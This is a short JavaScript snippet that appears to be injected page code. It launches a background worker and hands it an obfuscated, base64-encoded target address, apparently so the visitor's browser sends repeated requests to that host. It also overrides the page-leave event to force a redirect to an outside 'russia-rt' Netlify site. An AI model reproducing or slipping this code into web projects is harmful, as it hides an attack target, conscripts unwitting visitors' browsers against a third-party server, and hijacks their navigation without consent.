var pollingWorker = new Worker('polling.js');
pollingWorker.postMessage('aHR0cHM6Ly8xNzguMjQ4LjIzNC43Ng==');

window.onbeforeunload = function () {
  console.log(11111);
  window.location = 'https://russia-rt.netlify.app/';
}